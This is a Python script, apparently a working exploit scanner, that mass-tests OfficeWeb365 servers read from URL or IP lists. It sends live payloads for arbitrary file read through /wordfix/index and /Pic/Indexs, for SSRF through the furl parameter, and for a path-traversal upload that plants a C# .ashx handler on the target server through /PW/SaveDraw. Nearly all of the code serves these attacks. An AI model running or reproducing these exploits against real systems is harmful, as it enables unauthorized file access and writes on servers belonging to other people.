import argparse
import re
import threading
from urllib.parse import urlparse
import requests
from requests.exceptions import RequestException, Timeout
from urllib3.exceptions import InsecureRequestWarning

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    , 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    , 'Accept-Encoding': 'gzip, deflate'
    , 'Content-Type': 'application/x-www-form-urlencoded'
    , 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
}

data='''data:image/png;base64,{{filehash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler{public void ProcessRequest(System.Web.HttpContext context){System.Web.HttpResponse response = context.Response;response.Write("succ"+"ess");
string filePath = context.Server.MapPath("/") + context.Request.Path;if (System.IO.File.Exists(filePath)){    System.IO.File.Delete(filePath);}}public bool IsReusable{get { return false; }}}///---'''

Parsed_Urls = []
ports = []
global targets
targets = []

def title():
    print("\033[4;36m* \033[0m" * 24)
    print("\t\033[35m||OfficeWeb365检测工具||\033[0m")
    print("\t\033[33m【*】Author：btwl【*】\033[0m")
    print("\033[4;36m* \033[0m" * 24)

def process_url(url):
    parsed_url = urlparse(url)
    # 检查URL是否以'\'结尾，如果是则去掉
    if parsed_url.path.endswith('/'):
        parsed_url = parsed_url._replace(path=parsed_url.path[:-1])
    targets.append(parsed_url.geturl())
    return targets

def process_urls(file_path):
    try:
        # 读取文本文件
        with open(file_path, 'r') as f:
            content = f.read()
        # 匹配所有URL
        urls = re.findall(r'(https?://\S+)', content)
        for url in urls:
            parsed_url = urlparse(url)
            # 检查URL是否以'\'结尾，如果是则去掉
            if parsed_url.path.endswith('/'):
                parsed_url = parsed_url._replace(path=parsed_url.path[:-1])
            targets.append(parsed_url.geturl())
        return targets
    except FileNotFoundError:
        print(f"Error: File not found at path '{file_path}'.")

def process_hosts(file_path):
    # 读取文本文件
    with open(file_path, 'r') as f:
        content = f.read()
    # 匹配所有ip
    ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', content)
    for ip in ips:
        geturl = "http://" + ip
        Parsed_Urls.append(geturl)
    return Parsed_Urls

def process_ports(port_string):
    try:
        ports = []
        # 按逗号分割字符串
        port_ranges = port_string.split(',')
        for port_range in port_ranges:
            # 检查是否存在短横杠，表示端口范围
            if '-' in port_range:
                start, end = map(int, port_range.split('-'))
                # 将端口范围转换为列表
                ports.extend(range(start, end + 1))
            else:
                # 单个端口直接添加到列表
                ports.append(int(port_range))
        return ports
    except FileNotFoundError:
        print(f"Error format")


def wordfix(url):
    try:
        url = url + "/wordfix/index?f=QzpcV2luZG93c1xzeXN0ZW0uaW5p"
        response = requests.get(url=url, headers=headers, timeout=3, verify=False)
        # 不是200就报错
        response.raise_for_status()
        if b'<title>system</title>' in response.content:
            output = "[+]存在任意文件读取:" + url
            print("\033[93m%s\033[0m"%(output))
            return output
        else:
            return "none"
    except RequestException as other_err:
        return "none"

def pic(url):
    try:
        url1 = url+"/Pic/Indexs?imgs=6LVLLYWoPsDZN1S9933gtjNB9ctFRNXu09"
        response = requests.get(url=url1, headers=headers, timeout=2, verify=False)
        # 不是200就报错
        response.raise_for_status()
        if b'; for 16-bit app support' in response.content:
            output = "[+]存在任意文件读取:"+url1
            print("\033[93m%s\033[0m"%(output))
            return output
        else:
            return "none"
    except RequestException as other_err:
        return "none"

def ssrf(url):
    try:
        url1 = url+"/?furl=http://127.0.0.1/"
        response = requests.get(url=url1, headers=headers, timeout=3, verify=False)
        # 不是200就报错
        response.raise_for_status()
        if "无法获取文件，或者您的文件不是可预览的文件。" in response.text:
            output = "[+]可能存在ssrf:"+url1
            print("\033[93m%s\033[0m"%(output))
            return output
        else:
            return "none"
    except RequestException as other_err:
        return "none"

def upload(url):
    try:
        url1 = url+"/PW/SaveDraw?path=../../Content/img&idx=1.ashx"
        url2 = url+"/Content/img/UserDraw/drawPW1.ashx"
        response = requests.post(url=url1, headers=headers, data=data, timeout=3, verify=False)
        # 不是200就报错
        response.raise_for_status()
        if "ok" in response.text:
            res2=requests.get(url=url2, timeout=3, verify=False)
            res2.raise_for_status()
            if "success" in res2.text:
                output = "[+]存在drawPW文件上传:"+url+"/Content/img/UserDraw/drawPW1.ashx,不存在则有杀软"
                print("\033[91m%s\033[0m"%(output))
                requests.post(url=url1, headers=headers, data=data, timeout=3, verify=False)
                return output
            else:
                return "none"
        else:
            return "none"
    except RequestException as other_err:
        return "none"

# 多线程执行函数
def run_functions_threads(targets, output_file, thread_count):
    # 创建线程
    threads = []

    if thread_count is None:
        thread_count=4

    for target in targets:
        #创建并启动线程，交替执行函数
        thread = threading.Thread(target=execute_function_and_write, args=(wordfix, target, output_file))
        threads.append(thread)
        thread.start()

        thread = threading.Thread(target=execute_function_and_write, args=(pic, target, output_file))
        threads.append(thread)
        thread.start()

        thread = threading.Thread(target=execute_function_and_write, args=(ssrf, target, output_file))
        threads.append(thread)
        thread.start()

        thread = threading.Thread(target=execute_function_and_write, args=(upload, target, output_file))
        threads.append(thread)
        thread.start()

        # 控制线程数，等待已启动线程数不超过 thread_count
        if len(threads) >= thread_count:
            for t in threads:
                t.join()
            threads = []

    # 等待所有线程执行完成
    for thread in threads:
        thread.join()

# 通用的执行函数调用和写入结果
def execute_function_and_write(func, target, output_file):
    result = func(target)
    if result != "none" and output_file is not None:
        with open(output_file, 'a+', encoding='utf8') as r:
            r.write(result + '\n')

def main():
    title()
    # 创建 ArgumentParser 对象
    parser = argparse.ArgumentParser()

    # 添加命令行参数
    parser.add_argument("-a", "--target", required=False, help="检测单个url")
    parser.add_argument("-l", "--urlfile", required=False, help="批量检测,url的txt,每行一个")
    parser.add_argument("-i", "--hostfile", required=False, help="批量检测,ip的txt,每行一个,使用http请求")
    parser.add_argument("-p", "--port", required=False, help="设置端口,逗号或短横杠分割,默认8088")
    parser.add_argument("-o", "--output", required=False, help="输出文档")
    parser.add_argument("-t", "--thread", required=False, help="线程，默认4")
    parser.set_defaults(show_help=False)

    # 解析命令行参数
    args = parser.parse_args()

    # 处理端口
    if args.port:
        ports = process_ports(args.port)
    else:
        ports = ["8088"]

    # 处理地址
    if args.target:
        targets = process_url(args.target)
    elif args.urlfile:
        targets = process_urls(args.urlfile)
    elif args.hostfile:
        Parsed_Urls = process_hosts(args.hostfile)
        Parsed_tatgets = []
        for port in ports:
            for url in Parsed_Urls:
                target = f"{url}:{port}"
                Parsed_tatgets.append(target)
        targets = Parsed_tatgets

    # 禁用 InsecureRequestWarning 警告
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    #线程执行
    run_functions_threads(targets, args.output, int(args.thread))


if __name__ == "__main__":
    main()


#8238